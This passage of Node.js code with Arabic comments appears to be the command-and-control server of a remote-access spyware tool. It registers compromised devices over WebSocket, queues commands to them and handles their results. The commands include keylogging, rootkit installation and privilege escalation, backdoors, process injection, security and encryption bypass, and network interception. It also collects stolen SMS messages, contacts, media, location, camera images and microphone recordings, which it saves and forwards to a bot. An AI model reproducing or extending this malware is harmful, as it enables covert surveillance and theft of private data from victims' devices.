        });
      }
      
      // تحميل الأوامر المعلقة
      if (fs.existsSync(this.commandsFilePath)) {
        const commandsData = JSON.parse(fs.readFileSync(this.commandsFilePath, 'utf8'));
        commandsData.forEach(cmd => {
          if (!this.pendingCommands.has(cmd.deviceId)) {
            this.pendingCommands.set(cmd.deviceId, []);
          }
          this.pendingCommands.get(cmd.deviceId).push(cmd);
        });
      }
      
      // تحميل الملفات
      if (fs.existsSync(this.filesFilePath)) {
        this.uploadedFiles = JSON.parse(fs.readFileSync(this.filesFilePath, 'utf8'));
      }
      
      // تحميل البيانات
      if (fs.existsSync(this.dataFilePath)) {
        this.dataUpdates = JSON.parse(fs.readFileSync(this.dataFilePath, 'utf8'));
      }
      
      // تحميل الإحصائيات المتقدمة
      this.loadAdvancedStats();
      
      console.log('💾 تم تحميل البيانات المحلية بنجاح');
      console.log(`  📱 الأجهزة: ${this.devices.size}`);
      console.log(`  📨 الأوامر المعلقة: ${this.pendingCommands.size}`);
      console.log(`  📁 الملفات: ${this.uploadedFiles.length}`);
      console.log(`  📊 التحديثات: ${this.dataUpdates.length}`);
      
    } catch (error) {
      console.error('خطأ في تحميل البيانات المحلية:', error);
    }
  }

  startBackgroundServices() {
    // حفظ البيانات كل 5 دقائق
    setInterval(() => {
      this.savePersistentData();
    }, 300000);
    
    // تنظيف البيانات القديمة كل ساعة
    setInterval(() => {
      this.cleanupOldData();
    }, 3600000);
    
    // فحص الأجهزة غير النشطة كل 10 دقائق
    setInterval(() => {
      this.cleanupInactiveDevices();
    }, 600000);
    
    // إرسال الأوامر المعلقة كل دقيقة
    setInterval(() => {
      this.processPendingCommands();
    }, 60000);
    
    // تنظيف السجلات المتقدمة كل 12 ساعة
    setInterval(() => {
      this.cleanupAdvancedLogs(7 * 24 * 60 * 60 * 1000); // أسبوع
    }, 12 * 60 * 60 * 1000);
    
    console.log('🚀 تم بدء الخدمات الخلفية');
    console.log('  📊 حفظ البيانات: كل 5 دقائق');
    console.log('  🧹 تنظيف البيانات: كل ساعة');
    console.log('  🔍 فحص الأجهزة: كل 10 دقائق');
    console.log('  📨 إرسال الأوامر: كل دقيقة');
    console.log('  📋 تنظيف السجلات: كل 12 ساعة');
  }

  // بدء مراقبة الأداء
  startPerformanceMonitoring() {
    // تحديث إحصائيات الأداء كل دقيقة
    setInterval(() => {
      this.updatePerformanceStats();
    }, 60000);
    
    // حفظ إحصائيات الأداء كل 5 دقائق
    setInterval(() => {
      this.savePerformanceStats();
    }, 300000);
    
    console.log('📊 تم بدء مراقبة الأداء');
    console.log('  📈 تحديث الإحصائيات: كل دقيقة');
    console.log('  💾 حفظ الإحصائيات: كل 5 دقائق');
  }

  // تحديث إحصائيات الأداء
  updatePerformanceStats() {
    try {
      const now = Date.now();
      this.performanceStats.uptime = now - this.performanceStats.startTime;
      
      // إحصائيات النظام
      const systemStats = {
        cpuUsage: os.loadavg(),
        memoryUsage: process.memoryUsage(),
        freeMemory: os.freemem(),
        totalMemory: os.totalmem(),
        uptime: os.uptime(),
        platform: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length
      };
      
      this.performanceStats.system = systemStats;
      this.performanceStats.lastUpdate = now;
      
      console.log('📊 تحديث إحصائيات الأداء');
      console.log(`  💻 استخدام CPU: ${systemStats.cpuUsage[0].toFixed(2)}`);
      console.log(`  🧠 استخدام الذاكرة: ${(systemStats.memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB`);
      console.log(`  📱 الأجهزة المتصلة: ${this.devices.size}`);
      console.log(`  📨 الأوامر المعلقة: ${this.pendingCommands.size}`);
      
    } catch (error) {
      console.error('❌ خطأ في تحديث إحصائيات الأداء:', error);
    }
  }

  // حفظ إحصائيات الأداء
  savePerformanceStats() {
    try {
      const statsPath = path.join(this.localStoragePath, 'performance-stats.json');
      const stats = {
        ...this.performanceStats,
        timestamp: Date.now(),
        version: '2.0.0',
        features: {
          advancedCommands: true,
          performanceMonitoring: true,
          securityEnhancements: true,
          dataEncryption: true
        }
      };
      
      fs.writeFileSync(statsPath, JSON.stringify(stats, null, 2));
      console.log('💾 تم حفظ إحصائيات الأداء');
      
    } catch (error) {
      console.error('❌ خطأ في حفظ إحصائيات الأداء:', error);
    }
  }

  handleDeviceRegistration(ws, message) {
    try {
      const { deviceId, activationCode, timestamp, deviceInfo, capabilities, status } = message;
      
      console.log(`📱 تسجيل جهاز جديد: ${deviceId}`);
      console.log(`  🔑 كود التفعيل: ${activationCode || 'غير محدد'}`);
      console.log(`  📱 معلومات الجهاز:`, deviceInfo?.userAgent || 'غير متوفر');
      console.log(`  🌐 المنصة: ${deviceInfo?.platform || 'غير محدد'}`);
      console.log(`  🌍 اللغة: ${deviceInfo?.language || 'غير محدد'}`);
      
      const device = {
        ws: ws,
        deviceId: deviceId,
        activationCode: activationCode,
        status: status || 'online',
        lastSeen: new Date(),
        deviceInfo: deviceInfo || {},
        capabilities: capabilities || {},
        timestamp: timestamp,
        registered: true,
        activated: false
      };
      
      this.devices.set(deviceId, device);
      this.saveDeviceToDatabase(device);
      
      // إضافة الجهاز للمراقبة المتقدمة
      this.advancedMonitoring.addDeviceToMonitoring(deviceId, deviceInfo);
      
      // تحليل البيانات بالذكاء الاصطناعي
      const aiAnalysis = this.aiIntelligence.analyzeData({
        deviceId,
        deviceInfo,
        capabilities,
        status,
        timestamp: Date.now()
      }, { type: 'device_registration' });
      
      console.log(`✅ تم تسجيل الجهاز بنجاح: ${deviceId}`);
      console.log(`  📊 الحالة: ${device.status}`);
      console.log(`  🔧 الإمكانيات: ${Object.keys(device.capabilities).length}`);
      console.log(`  📅 وقت التسجيل: ${device.lastSeen.toLocaleString()}`);
      console.log(`  🧠 تحليل الذكاء الاصطناعي:`, aiAnalysis ? 'تم' : 'فشل');
      
      // إرسال تأكيد التسجيل للجهاز
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          type: 'registration_acknowledged',
          message: 'تم تسجيل الجهاز بنجاح - انتظار التفعيل',
          deviceId: deviceId,
          timestamp: Date.now()
        }));
        
        console.log(`📤 تم إرسال تأكيد التسجيل للجهاز: ${deviceId}`);
      }
      
      // إرسال الأوامر المعلقة
      this.sendPendingCommands(deviceId);
      
    } catch (error) {
      console.error('❌ خطأ في تسجيل الجهاز:', error);
    }
  }

  handleCommandResult(message) {
    const { commandId, action, command, status, result, error, timestamp } = message;
    
    // استخدام command إذا لم يكن action موجود
    const actualAction = action || command;
    
    // تحديث التاريخ
    this.updateCommandInHistory(commandId, status, result, error);
    
    console.log(`📨 نتيجة الأمر ${actualAction}: ${status}`);
    
    if (error) {
      console.error(`❌ خطأ في الأمر ${actualAction}:`, error);
    } else {
      console.log(`✅ تم تنفيذ الأمر ${actualAction} بنجاح`);
    }
    
    // معالجة الأوامر المتقدمة
    this.handleAdvancedCommandResult(actualAction, result, error, timestamp);
    
    // مراقبة الحدث بالأنظمة المتقدمة
    const deviceId = message.deviceId;
    if (deviceId) {
      // مراقبة الحدث
      this.advancedMonitoring.monitorEvent(deviceId, 'command_execution', {
        action: actualAction,
        status,
        result,
        error,
        timestamp
      });
      
      // تحليل البيانات بالذكاء الاصطناعي
      this.aiIntelligence.analyzeData({
        deviceId,
        action: actualAction,
        status,
        result,
        error,
        timestamp
      }, { type: 'command_result' });
    }
  }

  // معالجة نتائج الأوامر المتقدمة
  handleAdvancedCommandResult(action, result, error, timestamp) {
    try {
      switch (action) {
        case 'keylogger_start':
          this.handleKeyloggerResult('start', result, error, timestamp);
          break;
        case 'keylogger_stop':
          this.handleKeyloggerResult('stop', result, error, timestamp);
          break;
        case 'keylogger_get_data':
          this.handleKeyloggerData(result, error, timestamp);
          break;
        case 'rootkit_install':
          this.handleRootkitResult('install', result, error, timestamp);
          break;
        case 'rootkit_escalate':
          this.handleRootkitResult('escalate', result, error, timestamp);
          break;
        case 'rootkit_hide':
          this.handleRootkitResult('hide', result, error, timestamp);
          break;
        case 'backdoor_create':
          this.handleBackdoorResult('create', result, error, timestamp);
          break;
        case 'backdoor_execute':
          this.handleBackdoorResult('execute', result, error, timestamp);
          break;
        case 'backdoor_transfer':
          this.handleBackdoorResult('transfer', result, error, timestamp);
          break;
        case 'system_info':
          this.handleSystemResult('info', result, error, timestamp);
          break;
        case 'system_control':
          this.handleSystemResult('control', result, error, timestamp);
          break;
        case 'system_monitor':
          this.handleSystemResult('monitor', result, error, timestamp);
          break;
        case 'screenshot_take':
        case 'take_screenshot':
          this.handleScreenshotResult(result, error, timestamp);
          break;
        case 'contacts_get':
        case 'backup_contacts':
          this.handleContactsResult(result, error, timestamp);
          break;
        case 'sms_get':
        case 'backup_sms':
          this.handleSMSResult(result, error, timestamp);
          break;
        case 'media_get':
        case 'backup_media':
          this.handleMediaResult(result, error, timestamp);
          break;
        case 'location_get':
        case 'get_location':
          this.handleLocationResult(result, error, timestamp);
          break;
        case 'camera_capture':
        case 'record_camera':
          this.handleCameraResult(result, error, timestamp);
          break;
        case 'microphone_record':
          this.handleMicrophoneResult(result, error, timestamp);
          break;
        case 'file_browse':
          this.handleFileResult('browse', result, error, timestamp);
          break;
        case 'file_download':
          this.handleFileResult('download', result, error, timestamp);
          break;
        case 'network_intercept':
          this.handleNetworkResult('intercept', result, error, timestamp);
          break;
        case 'process_inject':
          this.handleProcessResult('inject', result, error, timestamp);
          break;
        
        // الأوامر المتقدمة الجديدة
        case 'system_control':
          this.handleAdvancedSystemResult(action, result, error, timestamp);
          break;
        case 'file_control':
          this.handleAdvancedFileResult(action, result, error, timestamp);
          break;
        case 'network_control':
          this.handleAdvancedNetworkResult(action, result, error, timestamp);
          break;
        case 'security_bypass':
          this.handleAdvancedSecurityResult(action, result, error, timestamp);
          break;
        case 'memory_control':
          this.handleAdvancedMemoryResult(action, result, error, timestamp);
          break;
        case 'registry_control':
          this.handleAdvancedRegistryResult(action, result, error, timestamp);
          break;
        case 'process_control':
          this.handleAdvancedProcessResult(action, result, error, timestamp);
          break;
        case 'device_control':
          this.handleAdvancedDeviceResult(action, result, error, timestamp);
          break;
        case 'registry_manipulate':
          this.handleRegistryResult('manipulate', result, error, timestamp);
          break;
        case 'memory_scan':
          this.handleMemoryResult('scan', result, error, timestamp);
          break;
        case 'encryption_bypass':
          this.handleEncryptionResult('bypass', result, error, timestamp);
          break;
        default:
          // أمر عادي، لا يحتاج معالجة خاصة
          break;
      }
    } catch (error) {
      console.error('خطأ في معالجة الأمر المتقدم:', error);
    }
  }

  // معالجة نتائج Keylogger
  handleKeyloggerResult(action, result, error, timestamp) {
    const logData = {
      type: 'keylogger',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('keylogger', logData);
    
    if (action === 'start') {
      console.log('🔑 تم بدء تسجيل المفاتيح بنجاح');
    } else if (action === 'stop') {
      console.log('⏹️ تم إيقاف تسجيل المفاتيح');
    }
    
    if (error) {
      console.error('❌ خطأ في Keylogger:', error);
    }
  }

  // معالجة بيانات Keylogger
  handleKeyloggerData(result, error, timestamp) {
    if (result && result.data) {
      const keyloggerData = {
        type: 'keylogger_data',
        data: result.data,
        count: result.data.length || 0,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('keylogger_data', keyloggerData);
      console.log(`🔑 تم استلام ${keyloggerData.count} سجل مفاتيح`);
    }
    
    if (error) {
      console.error('❌ خطأ في استلام بيانات Keylogger:', error);
    }
  }

  // معالجة نتائج Rootkit
  handleRootkitResult(action, result, error, timestamp) {
    const logData = {
      type: 'rootkit',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('rootkit', logData);
    
    if (action === 'install') {
      console.log('🔧 تم تثبيت Rootkit بنجاح');
    } else if (action === 'escalate') {
      console.log('⬆️ تم تصعيد الصلاحيات');
    } else if (action === 'hide') {
      console.log('👻 تم إخفاء العمليات');
    }
    
    if (error) {
      console.error('❌ خطأ في Rootkit:', error);
    }
  }

  // معالجة نتائج Backdoor
  handleBackdoorResult(action, result, error, timestamp) {
    const logData = {
      type: 'backdoor',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('backdoor', logData);
    
    if (action === 'create') {
      console.log('🚪 تم إنشاء Backdoor بنجاح');
    } else if (action === 'execute') {
      console.log('⚡ تم تنفيذ الأمر عن بعد');
    } else if (action === 'transfer') {
      console.log('📁 تم نقل الملفات');
    }
    
    if (error) {
      console.error('❌ خطأ في Backdoor:', error);
    }
  }

  // معالجة نتائج النظام
  handleSystemResult(action, result, error, timestamp) {
    const logData = {
      type: 'system',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('system', logData);
    
    if (action === 'info') {
      console.log('💻 تم الحصول على معلومات النظام');
    } else if (action === 'control') {
      console.log('🎮 تم التحكم في النظام');
    } else if (action === 'monitor') {
      console.log('📊 تم بدء مراقبة النظام');
    }
    
    if (error) {
      console.error('❌ خطأ في النظام:', error);
    }
  }

  // معالجة نتائج Screenshot
  handleScreenshotResult(result, error, timestamp) {
    if (result && result.image) {
      const screenshotData = {
        type: 'screenshot',
        image: result.image,
        size: result.size,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('screenshot', screenshotData);
      console.log('📸 تم التقاط لقطة شاشة');
      
      // إرسال النتيجة للبوت
      this.sendResultToBot('take_screenshot', screenshotData);
    }
    
    if (error) {
      console.error('❌ خطأ في Screenshot:', error);
      // إرسال الخطأ للبوت
      this.sendResultToBot('take_screenshot', null, error);
    }
  }

  // معالجة نتائج Contacts
  handleContactsResult(result, error, timestamp) {
    if (result && result.contacts) {
      const contactsData = {
        type: 'contacts',
        contacts: result.contacts,
        count: result.contacts.length || 0,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('contacts', contactsData);
      console.log(`👥 تم الحصول على ${contactsData.count} جهة اتصال`);
      
      // إرسال النتيجة للبوت
      this.sendResultToBot('backup_contacts', contactsData);
    }
    
    if (error) {
      console.error('❌ خطأ في Contacts:', error);
      // إرسال الخطأ للبوت
      this.sendResultToBot('backup_contacts', null, error);
    }
  }

  // معالجة نتائج SMS
  handleSMSResult(result, error, timestamp) {
    if (result && result.messages) {
      const smsData = {
        type: 'sms',
        messages: result.messages,
        count: result.messages.length || 0,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('sms', smsData);
      console.log(`💬 تم الحصول على ${smsData.count} رسالة SMS`);
      
      // إرسال النتيجة للبوت
      this.sendResultToBot('backup_sms', smsData);
    }
    
    if (error) {
      console.error('❌ خطأ في SMS:', error);
      // إرسال الخطأ للبوت
      this.sendResultToBot('backup_sms', null, error);
    }
  }

  // معالجة نتائج Media
  handleMediaResult(result, error, timestamp) {
    if (result && result.media) {
      const mediaData = {
        type: 'media',
        media: result.media,
        count: result.media.length || 0,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('media', mediaData);
      console.log(`📱 تم الحصول على ${mediaData.count} ملف وسائط`);
      
      // إرسال النتيجة للبوت
      this.sendResultToBot('backup_media', mediaData);
    }
    
    if (error) {
      console.error('❌ خطأ في Media:', error);
      // إرسال الخطأ للبوت
      this.sendResultToBot('backup_media', null, error);
    }
  }

  // معالجة نتائج Location
  handleLocationResult(result, error, timestamp) {
    if (result && result.location) {
      const locationData = {
        type: 'location',
        location: result.location,
        accuracy: result.accuracy,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('location', locationData);
      console.log('📍 تم الحصول على الموقع');
      
      // إرسال النتيجة للبوت
      this.sendResultToBot('get_location', locationData);
    }
    
    if (error) {
      console.error('❌ خطأ في Location:', error);
      // إرسال الخطأ للبوت
      this.sendResultToBot('get_location', null, error);
    }
  }

  // معالجة نتائج Camera
  handleCameraResult(result, error, timestamp) {
    if (result && result.image) {
      const cameraData = {
        type: 'camera',
        image: result.image,
        size: result.size,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('camera', cameraData);
      console.log('📷 تم التقاط صورة من الكاميرا');
      
      // إرسال النتيجة للبوت
      this.sendResultToBot('record_camera', cameraData);
    }
    
    if (error) {
      console.error('❌ خطأ في Camera:', error);
      // إرسال الخطأ للبوت
      this.sendResultToBot('record_camera', null, error);
    }
  }

  // معالجة نتائج Microphone
  handleMicrophoneResult(result, error, timestamp) {
    if (result && result.audio) {
      const microphoneData = {
        type: 'microphone',
        audio: result.audio,
        duration: result.duration,
        timestamp: timestamp || Date.now()
      };
      
      this.saveAdvancedCommandData('microphone', microphoneData);
      console.log('🎤 تم تسجيل الصوت');
    }
    
    if (error) {
      console.error('❌ خطأ في Microphone:', error);
    }
  }

  // معالجة نتائج File
  handleFileResult(action, result, error, timestamp) {
    const logData = {
      type: 'file',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('file', logData);
    
    if (action === 'browse') {
      console.log('📁 تم تصفح الملفات');
    } else if (action === 'download') {
      console.log('⬇️ تم تحميل الملف');
    }
    
    if (error) {
      console.error('❌ خطأ في File:', error);
    }
  }

  // معالجة نتائج Network
  handleNetworkResult(action, result, error, timestamp) {
    const logData = {
      type: 'network',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('network', logData);
    
    if (action === 'intercept') {
      console.log('🌐 تم اعتراض حركة الشبكة');
    }
    
    if (error) {
      console.error('❌ خطأ في Network:', error);
    }
  }

  // معالجة نتائج Process
  handleProcessResult(action, result, error, timestamp) {
    const logData = {
      type: 'process',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('process', logData);
    
    if (action === 'inject') {
      console.log('💉 تم حقن العملية');
    }
    
    if (error) {
      console.error('❌ خطأ في Process:', error);
    }
  }

  // معالجة نتائج Registry
  handleRegistryResult(action, result, error, timestamp) {
    const logData = {
      type: 'registry',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('registry', logData);
    
    if (action === 'manipulate') {
      console.log('🔧 تم التلاعب في السجل');
    }
    
    if (error) {
      console.error('❌ خطأ في Registry:', error);
    }
  }

  // معالجة نتائج Memory
  handleMemoryResult(action, result, error, timestamp) {
    const logData = {
      type: 'memory',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('memory', logData);
    
    if (action === 'scan') {
      console.log('🧠 تم فحص الذاكرة');
    }
    
    if (error) {
      console.error('❌ خطأ في Memory:', error);
    }
  }

  // معالجة نتائج Encryption
  handleEncryptionResult(action, result, error, timestamp) {
    const logData = {
      type: 'encryption',
      action: action,
      result: result,
      error: error,
      timestamp: timestamp || Date.now()
    };
    
    this.saveAdvancedCommandLog('encryption', logData);
    
    if (action === 'bypass') {
      console.log('🔓 تم تجاوز التشفير');
    }
    
    if (error) {
      console.error('❌ خطأ في Encryption:', error);
    }
  }

  // معالجات الأوامر المتقدمة الجديدة
  handleAdvancedSystemResult(action, result, error, timestamp) {
    try {
      console.log(`🔧 نتيجة أمر النظام المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر النظام: ${error}`);
        this.saveAdvancedCommandLog('advanced_system_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر النظام المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_system', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر النظام المتقدم:', error);
    }
  }

  handleAdvancedFileResult(action, result, error, timestamp) {
    try {
      console.log(`📁 نتيجة أمر الملفات المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر الملفات: ${error}`);
        this.saveAdvancedCommandLog('advanced_file_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر الملفات المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_file', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر الملفات المتقدم:', error);
    }
  }

  handleAdvancedNetworkResult(action, result, error, timestamp) {
    try {
      console.log(`🌐 نتيجة أمر الشبكة المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر الشبكة: ${error}`);
        this.saveAdvancedCommandLog('advanced_network_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر الشبكة المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_network', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر الشبكة المتقدم:', error);
    }
  }

  handleAdvancedSecurityResult(action, result, error, timestamp) {
    try {
      console.log(`🔒 نتيجة أمر تجاوز الأمان المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر تجاوز الأمان: ${error}`);
        this.saveAdvancedCommandLog('advanced_security_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر تجاوز الأمان المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_security', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر تجاوز الأمان المتقدم:', error);
    }
  }

  handleAdvancedMemoryResult(action, result, error, timestamp) {
    try {
      console.log(`💾 نتيجة أمر الذاكرة المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر الذاكرة: ${error}`);
        this.saveAdvancedCommandLog('advanced_memory_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر الذاكرة المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_memory', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر الذاكرة المتقدم:', error);
    }
  }

  handleAdvancedRegistryResult(action, result, error, timestamp) {
    try {
      console.log(`🔧 نتيجة أمر السجل المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر السجل: ${error}`);
        this.saveAdvancedCommandLog('advanced_registry_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر السجل المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_registry', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر السجل المتقدم:', error);
    }
  }

  handleAdvancedProcessResult(action, result, error, timestamp) {
    try {
      console.log(`⚙️ نتيجة أمر العمليات المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر العمليات: ${error}`);
        this.saveAdvancedCommandLog('advanced_process_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر العمليات المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_process', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر العمليات المتقدم:', error);
    }
  }

  handleAdvancedDeviceResult(action, result, error, timestamp) {
    try {
      console.log(`📱 نتيجة أمر الجهاز المتقدم: ${action}`);
      
      if (error) {
        console.error(`❌ خطأ في أمر الجهاز: ${error}`);
        this.saveAdvancedCommandLog('advanced_device_error', {
          action,
          error,
          timestamp
        });
      } else {
        console.log(`✅ تم تنفيذ أمر الجهاز المتقدم بنجاح`);
        this.saveAdvancedCommandData('advanced_device', {
          action,
          result,
          timestamp
        });
      }
      
      // تحديث الإحصائيات
      if (error) {
        this.advancedCommandStats.failedCommands++;
      } else {
        this.advancedCommandStats.successfulCommands++;
      }
      
    } catch (error) {
      console.error('خطأ في معالجة نتيجة أمر الجهاز المتقدم:', error);
    }
  }

  // حفظ سجلات الأوامر المتقدمة
  saveAdvancedCommandLog(type, logData) {
    try {
      const logsPath = path.join(this.localStoragePath, 'advanced-logs');
      if (!fs.existsSync(logsPath)) {
        fs.mkdirSync(logsPath, { recursive: true });
      }
      
      const logFilePath = path.join(logsPath, `${type}-logs.json`);
      let logs = [];
      
      if (fs.existsSync(logFilePath)) {
        logs = JSON.parse(fs.readFileSync(logFilePath, 'utf8'));
      }
      
      logs.push(logData);
      
      // الاحتفاظ بآخر 1000 سجل فقط
      if (logs.length > 1000) {
        logs = logs.slice(-1000);
      }
      
      fs.writeFileSync(logFilePath, JSON.stringify(logs, null, 2));
    } catch (error) {
      console.error(`خطأ في حفظ سجل ${type}:`, error);
    }
  }

  // حفظ بيانات الأوامر المتقدمة
  saveAdvancedCommandData(type, data) {
    try {
      const dataPath = path.join(this.localStoragePath, 'advanced-data');
      if (!fs.existsSync(dataPath)) {
        fs.mkdirSync(dataPath, { recursive: true });
      }
      
      const dataFilePath = path.join(dataPath, `${type}-data.json`);
      let allData = [];
      
      if (fs.existsSync(dataFilePath)) {
        allData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
      }
      
      // تشفير البيانات الحساسة
      const encryptedData = this.encryptSensitiveData(data);
      allData.push(encryptedData);
      
      // الاحتفاظ بآخر 500 سجل بيانات فقط
      if (allData.length > 500) {
        allData = allData.slice(-500);
      }
      
      fs.writeFileSync(dataFilePath, JSON.stringify(allData, null, 2));
    } catch (error) {
      console.error(`خطأ في حفظ بيانات ${type}:`, error);
    }
  }

  // تشفير البيانات الحساسة
  encryptSensitiveData(data) {
    try {
              const algorithm = 'aes-256-gcm';
        const key = crypto.scryptSync(this.securityConfig.encryptionKey, 'salt', 32);
        const iv = crypto.randomBytes(12);
        
        const cipher = crypto.createCipheriv(algorithm, key, iv);
      let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
      encrypted += cipher.final('hex');
      
      return {
        encrypted: true,
        iv: iv.toString('hex'),
        data: encrypted,
        timestamp: Date.now()
      };
    } catch (error) {
      console.error('خطأ في تشفير البيانات:', error);
      return data; // إرجاع البيانات بدون تشفير في حالة الخطأ
    }
  }

  // فك تشفير البيانات الحساسة
  decryptSensitiveData(encryptedData) {
    try {
      if (!encryptedData.encrypted) {
        return encryptedData;
      }
      
      const algorithm = 'aes-256-gcm';
      const key = crypto.scryptSync(this.securityConfig.encryptionKey, 'salt', 32);
      const iv = Buffer.from(encryptedData.iv, 'hex');
      
      const decipher = crypto.createDecipheriv(algorithm, key, iv);
      let decrypted = decipher.update(encryptedData.data, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      
      return JSON.parse(decrypted);
    } catch (error) {
      console.error('خطأ في فك تشفير البيانات:', error);
      return encryptedData; // إرجاع البيانات كما هي في حالة الخطأ
    }
  }

  handleDataUpdate(message) {
    const { deviceId, dataType, data, timestamp } = message;
    
    const dataUpdate = {
      id: this.generateCommandId(),
      deviceId: deviceId,
      dataType: dataType,
      data: data,
      timestamp: timestamp || Date.now()
    };
    
    this.dataUpdates.push(dataUpdate);
    this.saveDataUpdate(dataUpdate);
    
    console.log(`📊 تحديث بيانات من ${deviceId}: ${dataType}`);
    console.log(`  📅 الوقت: ${new Date(timestamp).toLocaleString()}`);
    console.log(`  📏 حجم البيانات: ${JSON.stringify(data).length} bytes`);
  }

  handleHeartbeat(message) {
    try {
      const { deviceId, timestamp, status } = message;
      const device = this.devices.get(deviceId);
      
      if (device) {
        device.lastSeen = new Date();
        device.status = status || 'online';
        this.updateDeviceStatus(deviceId, device.status);
        
        console.log(`💓 نبض من الجهاز: ${deviceId}`);
        console.log(`  📅 آخر ظهور: ${device.lastSeen.toLocaleString()}`);
        console.log(`  📊 الحالة: ${device.status}`);
        
        // إرسال تأكيد heartbeat للجهاز
        if (device.ws && device.ws.readyState === WebSocket.OPEN) {
          device.ws.send(JSON.stringify({
            type: 'heartbeat_acknowledged',
            timestamp: Date.now(),
            status: 'alive'
          }));
        }
      } else {
        console.log(`⚠️ نبض من جهاز غير مسجل: ${deviceId}`);
      }
    } catch (error) {
      console.error('❌ خطأ في معالجة نبض الجهاز:', error);
    }
  }

  handleActivationConfirmation(message) {
    try {
      // التعامل مع كلا النوعين من الرسائل
      const deviceId = message.deviceId || message.data?.deviceId;
      const deviceInfo = message.deviceInfo || message.data?.deviceInfo;
      const status = message.status || message.data?.status || 'active';
      const timestamp = message.timestamp || message.data?.timestamp || Date.now();
      
      console.log(`✅ تأكيد تفعيل الجهاز: ${deviceId}`);
      console.log(`  📅 وقت التفعيل: ${new Date(timestamp).toLocaleString()}`);
      console.log(`  📊 الحالة: ${status}`);
      console.log(`  📱 معلومات الجهاز:`, deviceInfo?.userAgent || 'غير متوفر');
      
      // تحديث حالة الجهاز
      if (deviceId && this.devices.has(deviceId)) {
        const device = this.devices.get(deviceId);
        device.activated = true;
